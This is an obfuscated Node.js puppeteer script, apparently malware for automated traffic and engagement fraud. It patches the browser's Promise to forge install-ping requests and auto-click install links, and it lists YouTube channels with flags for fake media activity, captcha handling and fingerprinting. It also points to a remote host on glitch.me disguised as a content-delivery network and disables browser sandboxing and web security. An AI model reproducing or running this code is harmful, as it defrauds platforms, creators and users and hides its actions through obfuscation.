                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1a56 + 0x5 * 0x43 + 0x9 * 0x2cf ? (this['block'] = P[-0xe9f + -0xc5 * 0x1b + -0x59 * -0x66], this['start'] = N - (-0x757 * 0x2 + -0x1b12 + -0x600 * -0x7), this['hash'](), this['hashed'] = -0xde6 + 0xa9 * -0x35 + 0x2a * 0x12a) : this['start'] = N;
                }
                return this['bytes'] > 0x16081816f + -0xc3296b9f * -0x1 + -0x123aaed0f && (this['hBytes'] += this['bytes'] / (0x82fc23c0 + 0xfeeee650 * -0x2 + -0x4f5c351c * -0x8) << -0x17c * 0x19 + 0x25eb * 0x1 + -0xcf * 0x1, this['bytes'] = this['bytes'] % (-0x130667e20 + -0x125d9e60 + 0x6 * 0x607604c0)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x997 + 0x940 + 0x58;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0xfd6 + 0x1d98 + -0x2d5e * 0x1] = this['block'], J[K >> 0x2 * 0x4b5 + 0x1db6 + -0x271e] |= x[0x2 * -0x35f + 0x5ac + 0x115 & K], this['block'] = J[0x1b3b + -0x59 * 0x43 + -0x3e0], K >= -0x1b2b + -0x1e70 + 0x1 * 0x39d3 && (this['hashed'] || this['hash'](), J[0xb10 + 0x2fc + 0x706 * -0x2] = this['block'], J[-0xb * -0x61 + -0xed * -0x2 + -0x5f5 * 0x1] = J[0x1f7e + -0x828 + -0x1755 * 0x1] = J[-0xb * 0x239 + 0xc5d + 0x12 * 0xac] = J[0x1cd2 + -0x1 * -0x22f4 + -0x3fc3] = J[0xef3 * -0x1 + 0x1 * 0x2007 + -0x1110] = J[-0x54 * -0x62 + 0x2 * 0x3c7 + -0x9 * 0x469] = J[-0xc9d + 0x1 * 0x454 + 0x2c5 * 0x3] = J[-0x101d + 0x4 * 0x6e9 + -0x20 * 0x5c] = J[-0x1a5d + 0x25e8 + 0xb83 * -0x1] = J[0x3b * -0x63 + 0xa96 + 0x2 * 0x622] = J[-0x1 * -0xb5f + 0x5b9 + -0x110e] = J[-0x1 * 0xe87 + 0x4 * -0x745 + 0x97 * 0x4a] = J[0x2 * -0x1216 + 0x1816 + -0x611 * -0x2] = J[-0x11 * -0x35 + 0x1092 + -0x140a] = J[-0x1c02 + 0x163a + 0x1f2 * 0x3] = J[0xc5 * 0x1d + -0x2 * -0x12af + -0x3ba0] = 0x26df + -0x22f3 + -0x3ec), J[-0xeda + -0x20e5 + -0xfef * -0x3] = this['hBytes'] << 0x18d4 * -0x1 + 0x3 * -0x737 + -0x94c * -0x5 | this['bytes'] >>> -0x9a * 0x3a + 0x173b + 0xbc6, J[-0x26f6 * 0x1 + -0x2174 + -0x1 * -0x4879] = this['bytes'] << -0x1 * -0x24be + -0x19fc + -0x15 * 0x83, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1137 + 0x4a * 0x6d + -0x1 * 0xe3b; J < -0x8b1 + -0x7 * -0xb1 + -0x42a * -0x1; ++J)
                K = Q[J - (-0x9d6 * -0x3 + 0xa1c + -0x1 * 0x279b)] ^ Q[J - (-0x2020 + -0x176e + 0x3796)] ^ Q[J - (-0xe9 * -0x10 + 0x16af + -0x2531 * 0x1)] ^ Q[J - (-0x859 * -0x1 + -0x1c65 + 0x141c)], Q[J] = K << 0x2bd * -0x1 + 0x1fd8 + -0x1d1a | K >>> -0xa7e + -0x14ea + 0x1f87;
              for (J = 0xa * 0x347 + -0x202d + -0x99; J < 0x67 * 0x44 + -0xd88 + 0x2 * -0x6e0; J += -0x209d + -0x1 * -0x212b + 0x89 * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * -0x369 + -0x5c6 * -0x2 + 0x1 * -0x81e | L >>> 0x11 * -0x18a + -0x127b + 0x2 * 0x1660) + (M & N | ~M & O) + P + (0x987d4c53 + 0x71fc26be + -0xaff6f978) + Q[J] << 0x2653 + 0xee5 * 0x2 + -0x2f * 0x173) << -0x19d0 + 0x1860 + -0x175 * -0x1 | P >>> 0xe3 * -0x2a + -0x14ee + 0x3 * 0x136d) + (L & (M = M << 0xe3 * -0x28 + 0x71 * -0x3 + -0x24e9 * -0x1 | M >>> 0x11a4 + 0x12b * -0x6 + 0x5 * -0x220) | ~L & N) + O + (0x3b01bbf * 0x2e + 0x59022ec7 + -0xa824b180) + Q[J + (-0x222a + -0x1 * 0x1917 + -0x1 * -0x3b42)] << -0x10ef + 0x1f0d * 0x1 + 0xd * -0x116) << 0x2a * 0x77 + -0x1 * -0xce + -0x144f * 0x1 | O >>> -0x300 + -0x8c * -0x3d + -0x1e41) + (P & (L = L << -0x1381 + 0x1d70 + 0x7 * -0x167 | L >>> 0x2302 * 0x1 + 0x22a6 + -0x1 * 0x45a6) | ~P & M) + N + (0x1 * 0x5cbb148e + -0x478389d * 0x1d + -0x4e66092 * -0x1a) + Q[J + (0x1d6 * 0x14 + 0x2 * -0x853 + -0x1410)] << -0xcd7 + -0x1 * 0x677 + -0x1 * -0x134e) << 0x1cb1 + -0x9f * 0x5 + 0x1991 * -0x1 | N >>> -0xb8 * -0x2b + -0x5 * 0x6a1 + 0x258) + (O & (P = P << 0xd2c + -0xad * -0x11 + -0x188b | P >>> -0x26e1 + -0x154b + 0x3c2e) | ~O & L) + M + (0x2 * -0x2935f3c7 + -0x4418e42 * 0x5 + 0x1 * 0xc2362871) + Q[J + (0x3c0 * -0x5 + -0x18b9 + -0x4 * -0xadf)] << 0x23 * 0x50 + -0x98f + -0x161) << -0x3c7 * -0x5 + -0x2421 + 0x1143 | M >>> 0x1b2 + 0xd0c + 0xea3 * -0x1) + (N & (O = O << -0x3 * 0x893 + 0x1 * 0x123 + 0x3e * 0x66 | O >>> 0x16bb + 0x1806 * 0x1 + -0x3 * 0xf95) | ~N & P) + L + (-0x37555eac + -0x318fa5e * 0xc + 0xb70394ad) + Q[J + (-0x2362 * 0x1 + -0x12d0 * 0x1 + 0x3636)] << -0x733 + -0x23 * 0x6f + 0x1660, N = N << -0x1 * 0x21cd + 0x7 * -0x12b + -0x2 * -0x150c | N >>> -0x314 * -0x2 + -0xbe * 0xa + 0x146;
              for (; J < -0x21a * 0x11 + 0x7d6 * -0x2 + 0x338e; J += -0x39a * -0x1 + 0xdfb + -0x464 * 0x4)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x18aa + 0x1de2 + 0x122d * -0x3 | L >>> -0x1ae4 + -0x1f + 0x6 * 0x485) + (M ^ N ^ O) + P + (-0x3 * 0x21f77043 + 0x1da06c76 + 0xb71fcff4) + Q[J] << -0x420 * -0x8 + -0x2011 * -0x1 + -0x1 * 0x4111) << -0x2da + 0x21f8 + -0x1f19 | P >>> -0x1ec3 + -0x7b5 * -0x1 + 0x1729) + (L ^ (M = M << -0x1780 + 0xaab * -0x2 + 0xb3d * 0x4 | M >>> 0x1 * -0x1a95 + 0x1ffd + -0x566) ^ N) + O + (0x4652bce0 + -0x269f * -0xa307 + 0xfeee368) + Q[J + (0x1cbb + 0x1e6c + 0x1d93 * -0x2)] << -0x2047 + 0x164d + 0x9fa) << -0x115 * -0x1 + -0x3 * 0x225 + 0x55f | O >>> 0x15b * -0x14 + 0x18ca + 0x26d) + (P ^ (L = L << -0x11 * -0x24 + 0x41 * 0x37 + -0x103d | L >>> 0x1 * 0x1df5 + 0x1 * 0x88d + -0x2680) ^ M) + N + (-0x55dec0bc + 0x716c64e0 + 0x534c477d) + Q[J + (0x1731 + -0x18c8 + -0x1 * -0x199)] << -0x2 * 0x9b6 + -0x7 * 0x41 + -0x51 * -0x43) << 0x1 * -0x1d4b + -0x1ab2 + 0x3802 | N >>> -0x84 + -0x1 * 0x20a1 + -0x1c0 * -0x13) + (O ^ (P = P << 0x8 * 0x2d9 + 0x83 * 0x22 + 0x4 * -0xa04 | P >>> 0x29f + 0x1fef * -0x1 + 0x36 * 0x8b) ^ L) + M + (0x6d421ef8 + -0xae0ee9f7 * 0x1 + -0x4626a0 * -0x281) + Q[J + (0x1ae7 + -0x1 * -0x1795 + -0x49 * 0xb1)] << 0xf5 * -0xb + -0x47 * -0x59 + -0xe28) << -0x11 * 0x189 + -0x1a67 + -0x5 * -0xa81 | M >>> -0x2014 * 0x1 + -0xbc3 * 0x2 + 0x37b5) + (N ^ (O = O << -0x1d28 + -0x14f2 + 0xc8e * 0x4 | O >>> -0xe * -0x241 + 0x232 * 0x1 + -0x21be) ^ P) + L + (-0xc9f28a27 * -0x1 + -0x1 * 0x2a7fa82a + -0x3098f65c) + Q[J + (0x5d + 0x176f + -0x17c8)] << 0x239 * -0xc + -0x2d * 0x3c + 0x2538, N = N << 0x9ff + -0xf2c + 0x54b | N >>> 0x1c45 + 0x1c6c + -0x1 * 0x38af;
              for (; J < 0x2 * -0x856 + -0x1b5f + 0x2c47; J += -0xdbb + 0xd0 + 0x30 * 0x45)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x125b * -0x1 + 0x1d19 * -0x1 + 0x5f * 0x1d | L >>> 0x547 * -0x5 + 0x66 * 0x5e + 0x17 * -0x7a) + (M & N | M & O | N & O) + P - (0x428033b * -0xe + -0x418cae6e + 0xeca11ecc) + Q[J] << -0x13de + -0x1 * 0x6fc + 0x1 * 0x1ada) << 0x2ef + -0x4 * -0x5db + -0x1a56 | P >>> 0x7 * -0x50b + 0x1703 + 0xc65) + (L & (M = M << 0x12ac + 0x5 * -0xd3 + -0xe6f | M >>> 0x172d + -0x26 * 0x14 + -0x1433) | L & N | M & N) + O - (-0x715e4992 + -0x1abf64f1 + -0x1ff * -0x7ec059) + Q[J + (-0x18d + -0x2176 + -0x36 * -0xa6)] << 0x1c77 + -0x277 * 0xe + 0x60b) << -0x1d99 + -0x5 * -0x646 + 0x1c0 * -0x1 | O >>> 0x1 * -0x1549 + -0x3 * 0xb10 + 0x1 * 0x3694) + (P & (L = L << 0x49d * -0x7 + -0x1 * 0x1495 + 0x66 * 0x85 | L >>> -0x1491 + -0x138 * 0x1c + 0x36b3) | P & M | L & M) + N - (-0xdef769 * -0x72 + 0x92add2c7 + 0x3 * -0x2c5be977) + Q[J + (-0xbb1 + 0x132b * -0x1 + -0x1 * -0x1ede)] << -0x10a3 + -0x1726 + 0xf * 0x2a7) << 0x1 * -0x1525 + -0x918 + 0x1e42 | N >>> 0x4 * 0x13 + 0x1eaf * 0x1 + -0x1ee0) + (O & (P = P << -0x2346 + 0x5 * -0x4a6 + 0x3aa2 | P >>> -0x3 * -0xa55 + -0x23b9 + 0x4bc) | O & L | P & L) + M - (-0x3c00704b + 0x4fd622f7 + 0x232b4 * 0x2a56) + Q[J + (0x1a8 * 0x7 + -0x565 * 0x2 + -0xcb)] << -0xb7e + 0x1 * -0x1537 + -0xae7 * -0x3) << -0xa48 + -0x26a + 0xcb7 | M >>> -0x1511 + 0x1 * 0x13b + 0x13f1) + (N & (O = O << 0xa5e + -0x2ce + 0x1 * -0x772 | O >>> -0x19 * 0x18b + -0x19 * -0x6d + 0x1bf0) | N & P | O & P) + L - (-0x4e73560e + -0x2e3 * 0x4401fd + 0x3eab * 0x62f9b) + Q[J + (0x1 * 0x69f + -0x1 * 0x107 + -0x6 * 0xee)] << -0x21f8 + -0x20f0 + -0x85d * -0x8, N = N << 0x2 * 0xba3 + 0x9e * -0x11 + -0x2 * 0x655 | N >>> 0x1917 + 0xb1e * 0x3 + -0x3a6f * 0x1;
              for (; J < -0x4d * -0x7b + -0xe2 * -0xd + -0x1 * 0x3029; J += 0x342 + -0x4a9 * 0x1 + 0x7 * 0x34)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x228f + 0x19d1 * 0x1 + 0x8c3 | L >>> -0x8b * -0x41 + -0x180b + 0x1 * -0xb25) + (M ^ N ^ O) + P - (0x10d45d73 * 0x5 + -0x53f5b019 + 0x356d1b04) + Q[J] << 0x2102 + 0xfb2 + -0x2 * 0x185a) << -0x8a5 * 0x1 + -0x1f * 0xcd + -0x1 * -0x217d | P >>> -0x14fc + -0xad * -0x1 + 0x146a) + (L ^ (M = M << -0x1a39 + 0x13d * 0x11 + 0x54a | M >>> 0x654 + -0x399 * -0x7 + -0x1f81) ^ N) + O - (-0x1abc9af1 + -0x1 * 0x1664a968 + 0x66be8283) + Q[J + (-0x14 * -0x12a + 0x2696 + 0x3ddd * -0x1)] << 0xd * 0x181 + 0x1e36 + -0x1 * 0x31c3) << 0x240f + -0x1b5 * -0x1 + -0x25bf | O >>> -0x1 * 0xc0d + -0xedc + 0x1b04) + (P ^ (L = L << -0x1 * -0x72b + 0x1 * -0xcaa + 0x59d * 0x1 | L >>> -0x6f2 + -0x11d5 + 0x18c9) ^ M) + N - (0x2467de7 * -0x1f + 0x3b468ae4 + -0x40dff23f * -0x1) + Q[J + (-0x986 + 0x3 * -0x5ae + 0x1 * 0x1a92)] << 0x198a + -0x15ae + 0xd * -0x4c) << 0x25ca + 0x2e8 * -0x6 + -0x1455 | N >>> 0x171 * 0x9 + 0x15b7 + -0x2295) + (O ^ (P = P << -0x1747 * 0x1 + 0x1271 + 0x4f4 | P >>> -0x20f8 + -0x1d * 0xbf + 0x1 * 0x369d) ^ L) + M - (-0x168dfdbe + -0x1b9b * 0xe2ff + 0x64a5914d) + Q[J + (0xd7 * 0x2b + -0x3d * 0x24 + -0x21e * 0xd)] << -0x1930 + 0x179 * -0x1 + 0xd * 0x20d) << -0x1180 + 0xb32 * -0x1 + 0x1 * 0x1cb7 | M >>> 0x166c + -0x2 * -0x301 + -0x1c53) + (N ^ (O = O << -0x7f * 0x33 + -0x1f21 + 0x388c | O >>> -0x27b * 0x1 + 0x2 * 0x664 + -0x5 * 0x20f) ^ P) + L - (-0x7a37cbb + 0x3d * -0x5ea821 + -0x1 * -0x53cecac2) + Q[J + (0xeff + -0x1ea4 + 0x13 * 0xd3)] << -0x2485 * -0x1 + 0xc83 * 0x1 + 0x18 * -0x20b, N = N << -0x2125 * -0x1 + -0x1d00 + -0x407 | N >>> -0x916 * 0x3 + -0x22f0 + 0x3e34;
              this['h0'] = this['h0'] + L << -0x78c + 0x1555 + 0x1 * -0xdc9, this['h1'] = this['h1'] + M << 0x52 * 0x30 + 0x43f * 0x9 + 0x1 * -0x3597, this['h2'] = this['h2'] + N << 0x21aa + 0x12cb + 0x1 * -0x3475, this['h3'] = this['h3'] + O << -0x60d * 0x2 + -0x1 * 0x14f9 + 0x2113, this['h4'] = this['h4'] + P << -0x1 * 0x16d5 + 0x3 * -0x391 + -0x862 * -0x4;
            }
            [Y(0x5)]() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x830 + -0x1 * -0x1ff + 0x64d & -0x1df6 + -0xfff + 0x2e04] + w[J >> 0x907 + 0x19 * -0x7b + 0x4 * 0xc5 & -0x219 + -0x1e5 * 0x4 + 0x164 * 0x7] + w[J >> 0x2 * 0xdfd + -0x25e7 * 0x1 + 0xa01 * 0x1 & 0xc6e + 0x1289 + -0x7ba * 0x4] + w[J >> 0x2 * -0x1381 + -0x1964 + 0x4076 & -0x1bc + -0x23 * -0x5f + -0xb32] + w[J >> 0x2458 + -0x14df + -0xf6d & -0x4b * 0x42 + 0x5d7 + -0x6c7 * -0x2] + w[J >> 0x2223 + -0x18d * 0x2 + -0x1f01 & -0x1 * 0x1859 + -0xbd + 0x1925] + w[J >> 0x16a8 + 0x1c6c + -0x3310 & -0x1 * -0xb9 + -0x1de9 + 0x1d3f] + w[-0x805 + 0x21e7 + -0x19d3 & J] + w[K >> -0x221c * -0x1 + -0x1146 + -0x1 * 0x10ba & 0x215c + 0x1b60 + -0x3cad] + w[K >> -0x1fcb + -0xd5c + 0x2d3f & 0x1 * -0x1de5 + -0x4 * -0x626 + 0x55c] + w[K >> -0x14bf + 0x2430 + -0xf5d & -0x285 * 0xe + -0xc09 + 0x2f5e] + w[K >> -0x21 * -0x3b + 0x7c2 * -0x3 + -0xfbb * -0x1 & 0xa44 + 0xa21 + 0x89 * -0x26] + w[K >> -0x9ec + 0x1ff5 + -0x15fd & 0x8 * -0x242 + 0x8b0 * 0x2 + 0x1 * 0xbf] + w[K >> -0x195 + -0x10b5 + 0x1252 & -0xd0f * -0x1 + 0x33e + -0x103e] + w[K >> -0x29 * -0x25 + -0x888 + 0x29f * 0x1 & -0x17eb * 0x1 + 0x1f * -0x12d + -0x1f3 * -0x1f] + w[0x26af + -0x2290 + -0x410 & K] + w[L >> -0x111 + 0x1dc3 * -0x1 + 0x1ef0 & 0x29d + -0xc + -0x282] + w[L >> 0x2352 + -0x1021 * -0x2 + 0x10df * -0x4 & -0x21c9 + -0x24d0 + 0x46a8] + w[L >> 0x26bb * -0x1 + -0xcde + -0x33ad * -0x1 & -0x78 * -0x2e + -0x471 * 0x3 + -0x82e] + w[L >> -0x1782 + 0xc1a + 0x8 * 0x16f & -0x157 * 0xb + -0xe * 0x11a + 0x1e38] + w[L >> 0x19 * 0x161 + -0xae7 * 0x1 + -0xbc3 * 0x2 & -0x1af5 + 0x59 * -0xa + 0x1e7e * 0x1] + w[L >> 0x1d86 + 0x1 * 0x170a + -0x3488 & 0x26f4 + 0x44f * 0x5 + -0x3c70] + w[L >> 0x191f + -0x1 * 0x1844 + -0xd7 & -0x132f + 0x2b * 0x3d + -0x8ff * -0x1] + w[0x1073 + 0x1 * 0x108d + -0xafb * 0x3 & L] + w[M >> 0x1 * 0x254f + 0x1f07 + -0x443a & 0x57 + -0x178b + 0x1743] + w[M >> 0xa2f + 0x1 * -0x4cd + -0x1 * 0x54a & 0x9c2 * 0x2 + 0x116 * 0x17 + 0x23 * -0x145] + w[M >> -0x1 * -0x1541 + 0x866 + -0x43 * 0x71 & 0x1 * -0xe8f + -0x12 * -0x1e8 + -0x13b2] + w[M >> -0x1c8b + 0x18 * 0x4a + 0x15ab * 0x1 & -0x1 * -0x98b + 0x174e + -0x20ca] + w[M >> 0x9 * -0xd5 + -0x2d * -0xcd + -0xe40 * 0x2 & 0x10ee * -0x2 + 0x5 * 0x43d + 0xcba] + w[M >> 0xa39 + 0x747 + -0x1178 & -0x1842 + -0x1303 + -0x4 * -0xad5] + w[M >> -0x17 * -0x179 + 0xc * -0x104 + -0x81 * 0x2b & -0x4a3 * -0x5 + -0xc20 + 0x2 * -0x580] + w[0x19d6 * 0x1 + -0x1d00 + 0x3 * 0x113 & M] + w[N >> -0xd85 + -0x1447 + 0x46 * 0x7c & -0xc6 * 0x2d + -0x14c1 + -0x3 * -0x128a] + w[N >> -0xc5c * 0x2 + -0x120d * -0x1 + -0x6c3 * -0x1 & 0x112b + 0x1 * 0x16b4 + -0x34 * 0xc4] + w[N >> 0x1d53 + -0x202 + -0x1b3d & 0x26ab * -0x1 + 0x494 + 0x6 * 0x5b1] + w[N >> 0x8e2 + -0x5dd + -0x2f5 * 0x1 & 0x1ba9 + 0x453 * 0x3 + -0x2893 * 0x1] + w[N >> -0x18ee + 0x4 * -0x633 + -0x17 * -0x22a & -0x15b + 0xba1 + -0xa37 * 0x1] + w[N >> -0xa3a + -0x1 * -0x11a1 + -0x75f & -0x929 * 0x1 + -0x82a * 0x4 + 0x29e0] + w[N >> 0x9e + 0x1 * 0x33b + -0x3d5 & 0x295 + 0xa6a + 0x3 * -0x450] + w[-0x30 * 0x48 + 0x3 * 0x86d + 0xbb8 * -0x1 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x12a1 + -0x1a65 + 0x7dc * 0x1 & 0xb2 * -0x21 + 0x237 * -0x9 + 0x2be0,
                J >> -0x23f8 + -0x551 * 0x3 + 0x33fb & -0x6 * -0x67 + 0x1 * 0x1a5f + -0x1bca,
                J >> 0x212e + 0x798 * 0x4 + 0x3f86 * -0x1 & -0x1a26 + 0x4 * -0x7ac + 0x39d5,
                -0x23e0 + 0x1999 + -0x1e1 * -0x6 & J,
                K >> -0x792 + -0x15b * 0x13 + 0x216b & -0x4 * -0x77e + 0x13a5 + -0x309e,
                K >> 0x2491 + 0x1f9c + -0x35 * 0x149 & 0x1f68 + -0x1c4a + -0x3 * 0xb5,
                K >> 0x119 * -0x8 + -0x1 * 0x1663 + 0xa3 * 0x31 & -0x51 * 0x43 + 0x2183 + 0x1 * -0xb51,
                0x1 * 0x1548 + -0x2f * 0xd1 + 0x1216 * 0x1 & K,
                L >> 0x207 * 0x1 + -0x238b + 0x1de * 0x12 & 0x7 * 0x125 + 0x2077 + 0xd29 * -0x3,
                L >> 0x545 + 0x1c4e * 0x1 + -0x2183 & 0xf22 + 0x1d2a + -0x2b4d,
                L >> 0x1488 + -0x14b * -0x1d + -0x1355 * 0x3 & -0x105 + 0x925 + 0x19 * -0x49,
                0x704 + 0x7 * 0x39a + -0x1f3b * 0x1 & L,
                M >> 0x1d * -0x10c + 0x4 * -0x7b9 + 0x68 * 0x97 & -0xa * -0x2d7 + -0x9f7 * -0x1 + -0x255e,
                M >> -0x10e3 + -0x829 + 0x191c & -0x55f * 0x1 + 0xce6 + 0x2c * -0x26,
                M >> -0xfa2 + 0x2277 + 0x1 * -0x12cd & -0xea5 + -0x355 * -0xb + -0x1503,
                -0xa0 * 0x1e + -0x21 * 0x11e + 0x389d & M,
                N >> 0x10b2 + -0x2ec * 0xd + -0xa1 * -0x22 & 0x1f9f + 0x44a * -0x6 + 0x2 * -0x272,
                N >> -0x137b + -0x1039 + 0x23c4 & 0x2 * 0x117 + -0x1573 + -0x511 * -0x4,
                N >> -0x151c + 0x1ab2 + 0x3 * -0x1da & -0x213 * -0x3 + -0x1 * 0x1909 + 0x13cf * 0x1,
                -0x1abb * 0x1 + -0x847 + 0x2401 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0xd19 * 0x2 + -0x1 * -0x959 + 0x1 * -0x2377), (K = new DataView(J))['setUint32'](-0xe5 * -0x3 + 0x12e2 + 0x1 * -0x1591, this['h0']), K['setUint32'](0x1 * -0x67 + -0xb32 * 0x1 + 0xb9d, this['h1']), K['setUint32'](-0x15c2 * 0x1 + 0x1 * -0x1da5 + 0x336f, this['h2']), K['setUint32'](-0x336 * -0x9 + -0x1a2e + -0x2ac, this['h3']), K['setUint32'](0x18df + -0xec + -0x17e3, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1696 + -0x1 * -0xff5 + -0xfd * 0x27];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1e65 + -0x35 * -0x6b + 0x41f * 0x2;
            J[-0x7a2 + -0x8 * 0x39d + 0x6 * 0x617]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x6b1 + 0x1 * 0x1298 + -0x1949 * 0x1] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x2469 + 0x255e * -0x1 + 0xf6), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x74f * 0x1 + 0x1 * 0xdbb + -0x66b;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1693 + 0x76e + -0x1 * -0x1501), Promise['resolve'](0xb * -0xd3 + -0xbb9 + 0x14cb);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1be0 + -0x1 * -0x23b9 + -0x3f99; j < -0x198b * 0x1 + -0x1045 + -0x1 * -0x29d1; j++)
    i();
}
const NETWORK_PATIENCE = -0x266a + -0x1b51 + 0x3d * 0x197 + (0x1 * -0x1a51 + -0x1c23 + 0x2c * 0x181) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x2a2 * -0x2 + -0x2058 + 0x259f) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x163e + -0x2 * 0x670 + 0x5 * 0x706);
    let h = e[f];
    if (c['JqsaqJ'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x36c * 0xb + -0x15c2 + 0x3b66, r, s, t = -0x1 * -0x40 + -0x5 * 0x4c + 0x13c; s = m['charAt'](t++); ~s && (r = q % (0x11cd + -0x1a79 + 0x8b0) ? r * (-0x746 + -0x16ea * 0x1 + 0x1e70) + s : s, q++ % (-0x1 * 0x376 + -0x1d * -0x139 + -0x1 * 0x1ffb)) ? o += String['fromCharCode'](0x6d8 + 0x665 * -0x1 + 0x46 * 0x2 & r >> (-(0x2ad * -0x2 + 0x844 * -0x1 + 0xda0) * q & -0x1 * -0xaba + 0x17 * 0x9b + 0x18a1 * -0x1)) : 0x239d + -0x9e6 + -0x19b7) {
          s = n['indexOf'](s);
        }
        for (let u = 0x1cee + 0x246 + -0x1f34, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x256b + -0x16f * -0x11 + 0xd1c))['slice'](-(-0x2 * -0x895 + 0x3a * 0xb + -0x13a6));
        }
        return decodeURIComponent(p);
      };
      c['LKVdRQ'] = i, b = arguments, c['JqsaqJ'] = !![];
    }
    const j = e[0xc3 * -0x17 + -0xd1b + 0xa * 0x310],
      k = f + j,
      l = b[k];
    return !l ? (h = c['LKVdRQ'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + Z(0x1b, 'l!nj'),
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x163e + -0x2 * 0x670 + 0x5 * 0x706);
    let h = e[f];
    return h;
  }, d(b, c);
}
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0xef * 0x14 + 0x1c14 + 0x12d * -0x8; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
